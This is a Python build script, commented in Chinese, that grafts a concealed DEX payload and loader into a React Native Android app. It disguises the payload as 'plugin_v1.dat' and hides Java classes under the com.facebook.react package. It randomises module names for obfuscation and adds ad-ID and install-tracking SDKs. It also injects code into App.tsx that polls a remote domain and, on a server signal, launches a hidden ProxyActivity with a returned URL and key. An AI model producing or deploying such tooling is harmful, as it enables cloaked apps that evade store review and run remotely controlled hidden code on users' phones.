#!/usr/bin/env python3
# upgrade_rn_dex.py
import os
import subprocess
import json
import re
import shutil
import random
import string
from pathlib import Path
from typing import Dict, Any

# =================== 用户输入处理 ===================
def get_user_inputs() -> Dict[str, str]:
    """获取用户输入信息"""
    print("=== RN+Dex 升级脚本 ===")
    
    # 获取RN项目路径
    project_path = input("请输入RN项目路径: ").strip()
    while not project_path or not Path(project_path).exists():
        print("❌ 项目路径不存在，请重新输入！")
        project_path = input("请输入RN项目路径: ").strip()
    
    # 获取DEX文件路径
    default_dex_path = str(Path(__file__).parent / "app" / "assets" / "plugin_v1.dat")
    dex_file_path = input(f"请输入DEX文件路径 (默认: {default_dex_path}): ").strip()
    
    # 如果用户未输入，则使用默认路径
    if not dex_file_path:
        dex_file_path = default_dex_path
        print(f"使用默认DEX文件路径: {dex_file_path}")
    
    # 检查文件是否存在
    if not Path(dex_file_path).exists():
        print("❌ DEX文件不存在，请检查路径！")
        return get_user_inputs()  # 重新输入
    
    # 获取自定义插件名称
    plugin_name = input("请输入自定义插件名称 (回车自动生成): ").strip()
    
    # 如果用户未输入，则自动生成插件名称
    if not plugin_name:
        plugin_name = ''.join(random.choices(string.ascii_letters, k=1)).upper() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(7, 12)))
        print(f"自动生成插件名称: {plugin_name}")
    
    # 生成随机的模块名称，用于混淆
    random_module_name = ''.join(random.choices(string.ascii_letters, k=1)).upper() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 10)))
    random_package_name = ''.join(random.choices(string.ascii_letters, k=1)).lower() + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 9)))
    
    # 获取API接口域名
    api_domain = input("请输入API接口域名 (如: https://www.skidu.xyz): ").strip()
    while not api_domain:
        print("❌ API接口域名不能为空，请重新输入！")
        api_domain = input("请输入API接口域名 (如: https://www.skidu.xyz): ").strip()
    
    # 获取URL路径参数
    first_path = input("请输入第一个随机路径字符串 (6-8位，以字母d结尾，回车自动生成): ").strip()
    
    # 如果用户未输入，则自动生成
    if not first_path:
        first_path = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 7))) + 'd'
        print(f"自动生成第一个路径字符串: {first_path}")
    elif not re.match(r'^[a-zA-Z0-9]{5,7}[a-zA-Z]d$', first_path):
        print("❌ 格式错误，请输入6-8位且以字母d结尾的字符串！")
        return get_user_inputs()  # 重新输入
    
    second_path = input("请输入第二个随机路径字符串 (6-8位，回车自动生成): ").strip()
    
    # 如果用户未输入，则自动生成
    if not second_path:
        second_path = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 8)))
        print(f"自动生成第二个路径字符串: {second_path}")
    elif not re.match(r'^[a-zA-Z0-9]{6,8}$', second_path):
        print("❌ 格式错误，请输入6-8位的字符串！")
        return get_user_inputs()  # 重新输入
    
    return {
        "project_path": project_path,
        "dex_file_path": dex_file_path,
        "plugin_name": plugin_name,
        "api_domain": api_domain,
        "first_path": first_path,
        "second_path": second_path,
        "random_module_name": random_module_name,
        "random_package_name": random_package_name
    }


# =================== 环境检查 ===================
def validate_environment() -> bool:
    """验证必需的工具是否可用"""
    print("\n🔍 检查环境依赖...")
    required_tools = ['node', 'npm', 'npx']
    missing_tools = []
    
    for tool in required_tools:
        if not shutil.which(tool):
            missing_tools.append(tool)
    
    if missing_tools:
        print(f"❌ 缺少必需工具: {', '.join(missing_tools)}")
        print("请先安装 Node.js (https://nodejs.org/)")
        return False
    
    print("✅ 环境检查通过")
    return True


def validate_project_structure(project_path: str) -> bool:
    """验证项目结构是否符合标准"""
    print("\n🔍 检查项目结构...")
    project = Path(project_path)
    
    # 检查android目录
    android_dir = project / "android"
    if not android_dir.exists() or not android_dir.is_dir():
        print("❌ 项目中未找到android目录")
        return False
    
    # 检查必要的Android文件
    required_files = [
        android_dir / "app" / "src" / "main" / "AndroidManifest.xml",
        android_dir / "app" / "build.gradle"
    ]
    
    for file_path in required_files:
        if not file_path.exists():
            print(f"❌ 未找到必需文件: {file_path}")
            return False
    
    print("✅ 项目结构检查通过")
    return True


# =================== Assets目录处理 ===================
def handle_assets_directory(project_path: str, dex_file_path: str) -> bool:
    """处理Assets目录，创建assets目录并复制DEX文件"""
    print("\n📁 处理Assets目录...")
    project = Path(project_path)
    android_assets_dir = project / "android" / "app" / "src" / "main" / "assets"
    
    try:
        # 创建assets目录（如果不存在）
        android_assets_dir.mkdir(parents=True, exist_ok=True)
        print(f"✅ 创建assets目录: {android_assets_dir}")
        
        # 复制DEX文件到assets目录
        dex_file = Path(dex_file_path)
        target_dex_path = android_assets_dir / dex_file.name
        
        print(f"📋 复制DEX文件: {dex_file} -> {target_dex_path}")
        shutil.copy2(dex_file, target_dex_path)
        
        print("✅ Assets目录处理完成")
        return True
    except Exception as e:
        print(f"❌ Assets目录处理失败: {e}")
        return False


# =================== Java代码部署 ===================
def deploy_java_files(project_path: str) -> bool:
    """部署Java代码文件到RN项目的android模块"""
    print("\n📱 部署Java代码文件...")
    project = Path(project_path)
    
    # 源文件路径（脚本所在目录的RN+Dex方案目录下）
    script_dir = Path(__file__).parent
    source_java_dir = script_dir / "app" / "src" / "com" / "facebook" / "react"
    
    # 目标目录
    target_java_dir = project / "android" / "app" / "src" / "main" / "java" / "com" / "facebook" / "react"
    
    # 检查源文件目录是否存在
    if not source_java_dir.exists():
        print(f"❌ 源Java文件目录不存在: {source_java_dir}")
        return False
    
    try:
        # 创建目标目录（如果不存在）
        target_java_dir.mkdir(parents=True, exist_ok=True)
        print(f"✅ 创建目标Java目录: {target_java_dir}")
        
        # 需要复制的Java文件
        java_files = ["CryptoUtils.java", "IPluginActivity.java", "ProxyActivity.java"]
        
        # 复制文件
        for java_file in java_files:
            source_file = source_java_dir / java_file
            target_file = target_java_dir / java_file
            
            if source_file.exists():
                print(f"📋 复制Java文件: {java_file}")
                shutil.copy2(source_file, target_file)
            else:
                print(f"❌ 源文件不存在: {source_file}")
                return False
        
        print("✅ Java代码部署完成")
        return True
    except Exception as e:
        print(f"❌ Java代码部署失败: {e}")
        return False


# =================== AndroidManifest.xml配置 ===================
def update_android_manifest(project_path: str) -> bool:
    """更新AndroidManifest.xml文件，注册ProxyActivity"""
    print("\n📝 更新AndroidManifest.xml...")
    project = Path(project_path)
    manifest_path = project / "android" / "app" / "src" / "main" / "AndroidManifest.xml"
    
    # ProxyActivity配置
    proxy_activity_config = '''
        <activity
            android:name="com.facebook.react.ProxyActivity"
            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode"
            android:exported="true"
            android:launchMode="singleTask"
            android:windowSoftInputMode="adjustResize" />'''
    
    try:
        # 读取AndroidManifest.xml内容
        # 首先尝试UTF-8编码，如果失败则尝试其他编码
        try:
            content = manifest_path.read_text(encoding='utf-8')
        except UnicodeDecodeError:
            # 如果UTF-8失败，尝试使用系统默认编码
            content = manifest_path.read_text()
        
        # 检查是否已经注册过
        if 'com.facebook.react.ProxyActivity' in content:
            print("✅ ProxyActivity已注册，无需重复注册")
            return True
        
        # 查找插入位置（在</application>标签前插入）
        insert_pos = content.rfind('</application>')
        if insert_pos == -1:
            print("❌ 未找到</application>标签，无法插入ProxyActivity配置")
            return False
        
        # 插入ProxyActivity配置
        updated_content = content[:insert_pos] + proxy_activity_config + '\n        ' + content[insert_pos:]
        
        # 写入更新后的内容
        # 使用UTF-8编码写入文件
        try:
            manifest_path.write_text(updated_content, encoding='utf-8')
        except UnicodeEncodeError:
            # 如果UTF-8失败，使用系统默认编码
            manifest_path.write_text(updated_content)
        print("✅ AndroidManifest.xml更新完成")
        return True
    except Exception as e:
        print(f"❌ AndroidManifest.xml更新失败: {e}")
        return False


# =================== Gradle依赖配置 ===================
def update_gradle_dependencies(project_path: str) -> bool:
    """更新Gradle依赖配置"""
    print("\n📦 更新Gradle依赖配置...")
    project = Path(project_path)
    gradle_path = project / "android" / "app" / "build.gradle"
    
    # 需要添加的依赖项
    dependencies = [
        'implementation("androidx.appcompat:appcompat:1.7.1")',
        'implementation("com.google.android.material:material:1.13.0")',
        'implementation("androidx.activity:activity:1.11.0")',
        'implementation("androidx.constraintlayout:constraintlayout:2.2.1")',
        'implementation("com.google.code.gson:gson:2.13.2")',
        'implementation \'com.adjust.sdk:adjust-android:4.35.0\'',
        'implementation("com.android.installreferrer:installreferrer:2.2")',
        'implementation \'com.google.android.gms:play-services-ads-identifier:18.1.0\''
    ]
    
    try:
        # 读取build.gradle内容
        # 首先尝试UTF-8编码，如果失败则尝试其他编码
        try:
            content = gradle_path.read_text(encoding='utf-8')
        except UnicodeDecodeError:
            # 如果UTF-8失败，尝试使用系统默认编码
            content = gradle_path.read_text()
        
        # 查找dependencies块
        dependencies_pos = content.find("dependencies")
        if dependencies_pos == -1:
            print("❌ 未找到dependencies块，无法添加依赖")
            return False
        
        # 查找dependencies块的开始大括号
        open_brace_pos = content.find("{", dependencies_pos)
        if open_brace_pos == -1:
            print("❌ 未找到dependencies块的开始大括号，无法添加依赖")
            return False
        
        # 查找dependencies块的结束大括号
        close_brace_pos = open_brace_pos
        brace_count = 1
        for i in range(open_brace_pos + 1, len(content)):
            if content[i] == '{':
                brace_count += 1
            elif content[i] == '}':
                brace_count -= 1
                if brace_count == 0:
                    close_brace_pos = i
                    break
        
        if brace_count != 0:
            print("❌ dependencies块格式错误，无法添加依赖")
            return False
        
        # 检查是否已经添加过这些依赖
        already_added = True
        for dep in dependencies:
            # 提取依赖的关键部分进行检查
            dep_key = dep.split(' ')[0].replace('implementation', '').replace('(', '').replace(')', '').replace("'", '').replace('"', '').strip()
            if dep_key and dep_key not in content:
                already_added = False
                break
        
        if already_added:
            print("✅ Gradle依赖已配置，无需重复添加")
            return True
        
        # 在dependencies块中添加依赖项
        # 找到第一个依赖项的位置
        first_dep_pos = content.find("implementation", open_brace_pos)
        if first_dep_pos == -1 or first_dep_pos > close_brace_pos:
            # 如果没有找到现有的implementation，就在大括号后添加
            insert_pos = open_brace_pos + 1
        else:
            # 如果找到了现有的implementation，就在第一个依赖项前添加
            insert_pos = first_dep_pos
        
        # 构造要插入的依赖项内容
        dependencies_content = "\n    " + "\n    ".join(dependencies) + "\n\n"
        
        # 插入依赖项
        updated_content = content[:insert_pos] + dependencies_content + content[insert_pos:]
        
        # 写入更新后的内容
        # 使用UTF-8编码写入文件
        try:
            gradle_path.write_text(updated_content, encoding='utf-8')
        except UnicodeEncodeError:
            # 如果UTF-8失败，使用系统默认编码
            gradle_path.write_text(updated_content)
        print("✅ Gradle依赖配置更新完成")
        return True
    except Exception as e:
        print(f"❌ Gradle依赖配置更新失败: {e}")
        return False


# =================== 自定义插件处理 ===================
def handle_custom_plugin(project_path: str, plugin_name: str, random_module_name: str, random_package_name: str) -> bool:
    """处理自定义插件"""
    print("\n🔧 处理自定义插件...")
    project = Path(project_path)
    
    try:
        # 创建随机模块目录
        random_module_dir = project / "android" / "app" / "src" / "main" / "java" / "com" / random_package_name.lower()
        random_module_dir.mkdir(parents=True, exist_ok=True)
        print(f"✅ 创建随机模块目录: {random_module_dir}")
        
        # 创建随机模块Java文件（替换EventModule名称）
        random_module_content = f'''package com.{random_package_name.lower()};

import android.content.Intent;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import com.facebook.react.ProxyActivity;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.bridge.ReactContextBaseJavaModule;
import com.facebook.react.bridge.ReactMethod;

public class {random_module_name} extends ReactContextBaseJavaModule {{
    private final ReactApplicationContext reactContext;

    public {random_module_name}(@Nullable ReactApplicationContext reactContext) {{
        super(reactContext);
        this.reactContext = reactContext;
    }}

    @NonNull
    @Override
    public String getName() {{
        return "{random_module_name}";
    }}

    @ReactMethod
    public void jumpEvent(String url, String token) {{
        try {{
            reactContext.runOnUiQueueThread(() -> {{
                Intent intent = new Intent(reactContext, ProxyActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("url", url);
                intent.putExtra("token", token);
                reactContext.startActivity(intent);
            }});
        }} catch (Exception e) {{
            //
        }}
    }}
}}
'''
        
        # 写入随机模块Java文件
        random_module_file = random_module_dir / f"{random_module_name}.java"
        random_module_file.write_text(random_module_content, encoding='utf-8')
        print(f"✅ 创建随机模块文件: {random_module_file}")
        
        # 创建随机包Java文件（替换MyAppPackage名称）
        random_app_package_content = f'''package com.{random_package_name.lower()};

import androidx.annotation.NonNull;
import com.facebook.react.ReactPackage;
import com.facebook.react.bridge.NativeModule;
import com.facebook.react.bridge.ReactApplicationContext;
import com.facebook.react.uimanager.ViewManager;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class {random_module_name}Package implements ReactPackage {{

    @NonNull
    @Override
    public List<ViewManager> createViewManagers(@NonNull ReactApplicationContext reactApplicationContext) {{
        return Collections.emptyList();
    }}

    @NonNull
    @Override
    public List<NativeModule> createNativeModules(@NonNull ReactApplicationContext reactContext) {{
        List<NativeModule> modules = new ArrayList<>();
        modules.add(new {random_module_name}(reactContext));
        return modules;
    }}
}}
'''
        
        # 写入随机包Java文件
        random_app_package_file = random_module_dir / f"{random_module_name}Package.java"
        random_app_package_file.write_text(random_app_package_content, encoding='utf-8')
        print(f"✅ 创建随机包文件: {random_app_package_file}")
        
        # 更新MainApplication文件，添加插件包（仅支持Kotlin版本）
        # 获取项目名称（从项目路径的最后一部分）
        project_name = project.name
        
        # 检查Kotlin版本的MainApplication（需要递归查找）
        main_application_kt_path = None
        java_dir = project / "android" / "app" / "src" / "main" / "java"
        
        # 递归查找MainApplication.kt文件
        for path in java_dir.rglob("MainApplication.kt"):
            main_application_kt_path = path
            print(f"🔍 找到MainApplication.kt文件: {path}")
            break
        
        if main_application_kt_path and main_application_kt_path.exists():
            # 处理Kotlin版本的MainApplication
            update_main_application_kotlin(main_application_kt_path, project_name, random_module_name, random_package_name)
        else:
            print("⚠️ 未找到MainApplication.kt文件，跳过更新")
        
        print("✅ 自定义插件处理完成")
        return True
    except Exception as e:
        print(f"❌ 自定义插件处理失败: {e}")
        return False


def update_main_application_kotlin(main_application_path, project_name, random_module_name, random_package_name):
    """更新Kotlin版本的MainApplication文件"""
    try:
        print(f"🔧 开始更新MainApplication.kt文件: {main_application_path}")
        # 读取MainApplication.kt内容
        main_app_content = main_application_path.read_text(encoding='utf-8')
        
        # 添加导入语句
        import_statement = f"import com.{random_package_name.lower()}.{random_module_name}Package\n"
        if f"import com.{random_package_name.lower()}.{random_module_name}Package" not in main_app_content:
            # 找到package语句后添加导入
            package_pos = main_app_content.find("package")
            if package_pos != -1:
                # 找到下一行的开始位置
                next_line_pos = main_app_content.find("\n", package_pos) + 1
                main_app_content = main_app_content[:next_line_pos] + import_statement + main_app_content[next_line_pos:]
                print(f"✅ 添加导入语句: {import_statement.strip()}")
        
        # 添加包到列表中
        if f"{random_module_name}Package()" not in main_app_content:
            # 查找注释位置
            comment_pos = main_app_content.find("// add(MyReactNativePackage())")
            if comment_pos != -1:
                # 在注释后添加包
                insert_pos = comment_pos + len("// add(MyReactNativePackage())")
                main_app_content = main_app_content[:insert_pos] + f"\n          add({random_module_name}Package())" + main_app_content[insert_pos:]
                print(f"✅ 添加插件包注册: {random_module_name}Package()")
        
        # 写入更新后的内容
        main_application_path.write_text(main_app_content, encoding='utf-8')
        print("✅ 更新MainApplication.kt文件")
    except Exception as e:
        print(f"❌ 更新MainApplication.kt文件失败: {e}")


# =================== App.tsx更新 ===================
def update_app_tsx(project_path: str, api_domain: str, first_path: str, second_path: str, random_module_name: str) -> bool:
    """更新App.tsx文件，添加动态控制接口代码"""
    print("\n📝 更新App.tsx文件...")
    project = Path(project_path)
    app_tsx_path = project / "App.tsx"
    
    # 检查App.tsx是否存在
    if not app_tsx_path.exists():
        print("❌ 未找到App.tsx文件")
        return False
    
    try:
        # 读取App.tsx内容
        # 首先尝试UTF-8编码，如果失败则尝试其他编码
        try:
            content = app_tsx_path.read_text(encoding='utf-8')
        except UnicodeDecodeError:
            # 如果UTF-8失败，尝试使用系统默认编码
            content = app_tsx_path.read_text()
        
        # 检查是否已经添加过相关代码
        if 'DeviceInfo' in content and 'fetch(' in content:
            print("✅ App.tsx已包含相关代码，无需重复添加")
            return True
        
        # 添加导入语句（在文件开头附近添加）
        import_pos = content.find("import")
        if import_pos == -1:
            import_pos = 0
        
        import_code = f"import DeviceInfo from 'react-native-device-info';\nimport {{ NativeModules }} from 'react-native';\nconst {{ {random_module_name} }} = NativeModules;\n"
        updated_content = content[:import_pos] + import_code + content[import_pos:]
        
        # 添加useEffect代码（在组件函数中添加）
        # 查找函数组件的位置
        component_pos = updated_content.find("function App()")
        if component_pos == -1:
            component_pos = updated_content.find("const App")
        
        if component_pos != -1:
            # 查找useEffect或组件主体
            effect_pos = updated_content.find("useEffect", component_pos)
            if effect_pos == -1:
                # 如果没有useEffect，找到组件主体
                body_pos = updated_content.find("{", component_pos)
                if body_pos != -1:
                    effect_code = f"\n  useEffect(() => {{\n    console.log('初始化');\n    // 获取应用包名\n    const appId = DeviceInfo.getBundleId();\n    \n    // 动态生成URL\n    fetch(`{api_domain}/{first_path}/${{appId}}/{second_path}`)\n      .then(response => response.json())\n      .then(data => {{\n        if (data && data.toUrl && data.sdkKey) {{\n          // 这里是自定义的插件调用方式，需要和插件同步\n          {random_module_name}.jumpEvent(data.toUrl, data.sdkKey);\n          setTimeout(() => {{}}, 3000);\n        }}\n        console.log(data);\n      }});\n  }}, []);\n"
                    updated_content = updated_content[:body_pos+1] + effect_code + updated_content[body_pos+1:]
        
        # 写入更新后的内容
        # 使用UTF-8编码写入文件
        try:
            app_tsx_path.write_text(updated_content, encoding='utf-8')
        except UnicodeEncodeError:
            # 如果UTF-8失败，使用系统默认编码
            app_tsx_path.write_text(updated_content)
        print("✅ App.tsx更新完成")
        return True
    except Exception as e:
        print(f"❌ App.tsx更新失败: {e}")
        return False


# =================== 主执行流程 ===================
def main():
    """主函数"""
    print("🚀 开始RN+Dex升级流程")
    
    # 1. 获取用户输入
    user_inputs = get_user_inputs()
    
    # 2. 环境检查
    if not validate_environment():
        return
    
    # 3. 项目结构检查
    if not validate_project_structure(user_inputs["project_path"]):
        return
    
    # 4. Assets目录处理
    if not handle_assets_directory(user_inputs["project_path"], user_inputs["dex_file_path"]):
        return
    
    # 5. Java代码部署
    if not deploy_java_files(user_inputs["project_path"]):
        return
    
    # 6. AndroidManifest.xml配置
    if not update_android_manifest(user_inputs["project_path"]):
        return
    
    # 7. Gradle依赖配置
    if not update_gradle_dependencies(user_inputs["project_path"]):
        return
    
    # 8. 自定义插件处理
    if not handle_custom_plugin(user_inputs["project_path"], user_inputs["plugin_name"], user_inputs["random_module_name"], user_inputs["random_package_name"]):
        return
    
    # 9. App.tsx更新
    if not update_app_tsx(user_inputs["project_path"], user_inputs["api_domain"], 
                         user_inputs["first_path"], user_inputs["second_path"], user_inputs["random_module_name"]):
        return
    
    # 9. 完成
    print("\n🎉 RN+Dex升级完成！")
    print("💡 请检查以下事项：")
    print("   1. 确认Java文件已正确部署")
    print("   2. 确认AndroidManifest.xml已更新")
    print("   3. 确认App.tsx已添加动态控制代码")
    print("   4. 确保react-native-device-info库已安装")
    print("   5. 构建项目: cd", user_inputs["project_path"], "&& npx react-native build-android")


if __name__ == "__main__":
    main()
